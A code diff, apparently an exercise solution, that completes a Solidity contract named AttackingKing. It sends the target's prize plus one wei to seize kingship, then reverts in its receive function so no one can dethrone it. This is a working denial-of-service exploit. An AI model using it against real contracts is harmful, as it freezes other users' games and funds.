@@ -12,5 +12,14 @@ contract AttackingKing {
 
     function hackContract() external {
         // Code me!
+        uint prize = King(payable(contractAddress))._prize();
+        (bool success, ) = payable(contractAddress).call{value: prize + 1}("");
+        require(success, "Hack failed.");
+    }
+
+    receive() external payable {
+        if (King(payable(contractAddress))._king() == address(this)) {
+          revert("I am the king!");
+        }
     }
 }
